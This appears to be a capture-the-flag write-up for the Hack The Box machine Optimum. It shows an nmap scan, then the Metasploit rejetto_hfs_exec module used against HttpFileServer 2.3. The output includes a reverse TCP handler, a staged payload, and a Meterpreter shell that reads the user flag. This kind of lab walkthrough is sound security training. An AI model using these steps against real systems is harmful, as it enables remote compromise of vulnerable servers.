
# HTB - Optimum
## OS - Windows

I started with an nmap scan of Optimum (IP address: 10.10.10.8)

```
└──╼ $sudo nmap -sC -sV 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 15:22 PDT
Nmap scan report for 10.10.10.8
Host is up (0.094s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.28 seconds

```

So only port 80 is up and running.

We see that the software used is "HttpFileServer" httpd 2.3. I fire up metasploit and search for HttpFileServer. Sure enough, there is an exploit module for this.

```
msf5 > search HttpFileServer

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution



```


I use that exploit

```
msf5 > use exploit/windows/http/rejetto_hfs_exec 

```

I set the options/. Only the RHOST was required. And then ran the module.

```
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Using URL: http://0.0.0.0:8080/N224sid5itdo
[*] Local IP: http://172.25.252.98:8080/N224sid5itdo
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /N224sid5itdo
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.14.10:4444 -> 10.10.10.8:49167) at 2020-09-19 15:33:34 -0700

[!] Tried to delete %TEMP%\sfeWKJqCPBq.vbs, unknown result
[*] Server stopped.

meterpreter > 


```

Wasn't sure why the server stopped, but ls command showed the remote user directory.

```
meterpreter > ls
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2020-09-26 00:31:46 -0700  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 04:57:16 -0700  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 03:58:52 -0800  hfs.exe
100444/r--r--r--  32      fil   2017-03-18 05:13:18 -0700  user.txt.txt

meterpreter > cat user.txt.txt

```


I got the user flag. 



